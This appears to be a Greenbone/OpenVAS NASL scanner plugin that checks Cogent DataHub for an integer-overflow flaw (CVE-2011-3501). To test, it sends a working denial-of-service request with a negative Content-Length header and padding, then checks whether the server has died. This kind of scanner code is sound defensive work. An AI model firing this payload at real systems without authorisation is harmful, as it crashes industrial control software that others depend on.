if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802247" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-09-22 10:24:03 +0200 (Thu, 22 Sep 2011)" );
	script_bugtraq_id( 49611 );
	script_cve_id( "CVE-2011-3501" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "Cogent DataHub Integer Overflow Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_require_ports( "Services/www", 80 );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/45967" );
	script_xref( name: "URL", value: "http://aluigi.altervista.org/adv/cogent_3-adv.txt" );
	script_xref( name: "URL", value: "http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-03.pdf" );
	script_tag( name: "impact", value: "Successful exploitation may allow remote attackers to allows
  remote attackers to cause a denial of service." );
	script_tag( name: "affected", value: "Cogent DataHub 7.1.1.63 and prior." );
	script_tag( name: "insight", value: "The flaw is due to an integer overflow error in the webserver
  when handling the HTTP 'Content-Length' header can be exploited by sending
  specially crafted HTTP requests." );
	script_tag( name: "solution", value: "Upgrade to Cogent DataHub version 7.1.2 or later." );
	script_tag( name: "summary", value: "The host is running Cogent DataHub and is prone to integer
  overflow vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.cogentdatahub.com/Products/Cogent_DataHub.html" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
res = http_get_cache( item: "/index.asp", port: port );
res2 = http_get_cache( item: "/demo.asp", port: port );
if(!ContainsString( res, "<title>DataHub Web Server</title>" ) && !ContainsString( res2, "<title>DataHub Web Server</title>" )){
	exit( 0 );
}
host = http_host_name( port: port );
attack = NASLString( "POST / HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Length: -1\\r\\n\\r\\n", crap( 4079 ) );
res = http_send_recv( port: port, data: attack );
req = http_get( item: "/", port: port );
res = http_send_recv( port: port, data: req );
if(!res){
	if(http_is_dead( port: port )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

